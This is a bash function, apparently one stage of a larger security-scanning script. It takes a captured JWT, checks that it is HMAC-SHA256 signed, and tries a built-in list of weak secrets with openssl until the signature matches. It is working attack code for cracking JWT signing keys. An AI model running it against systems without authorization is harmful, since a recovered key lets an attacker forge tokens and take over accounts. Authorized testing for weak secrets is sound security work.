bt_17_jwt_secret_brute() {
    _section "[BT 17/30] JWT SECRET BRUTE-FORCE"
    run "Testing JWT signing secret against wordlist..."
    > "$SESSION/bt/jwt_secret_brute.txt"
    [ ! -s "$SESSION/auth/jwt_found.txt" ] && { info "No JWT to brute-force"; return; }
    local jwt=$(head -1 "$SESSION/auth/jwt_found.txt" 2>/dev/null)
    [ -z "$jwt" ] && return
    local header=$(echo "$jwt" | cut -d. -f1)
    local payload_b64=$(echo "$jwt" | cut -d. -f2)
    local SECRETS=("secret" "password" "123456" "admin" "jwt" "token" "key" "supersecret"
        "your-256-bit-secret" "mysecret" "secretkey" "changeme" "default" "test" "dev")
    local header_dec=$(echo "$header" | tr '_-' '/+' | base64 -d 2>/dev/null)
    echo "$header_dec" | grep -q '"alg":"HS256"' || { info "Not HMAC-signed — brute-force not applicable"; return; }
    for secret in "${SECRETS[@]}"; do
        local test_sig=$(echo -n "${header}.${payload_b64}" | openssl dgst -sha256 -hmac "$secret" -binary | base64 -w0 | tr '+/' '-_' | tr -d '=')
        local existing_sig=$(echo "$jwt" | cut -d. -f3)
        [ "$test_sig" = "$existing_sig" ] && {
            echo "JWT SECRET FOUND: '$secret'" >> "$SESSION/bt/jwt_secret_brute.txt"
            bt "JWT secret cracked: '$secret'!"
            return
        }
    done
    echo "JWT secret not in common wordlist" >> "$SESSION/bt/jwt_secret_brute.txt"
}

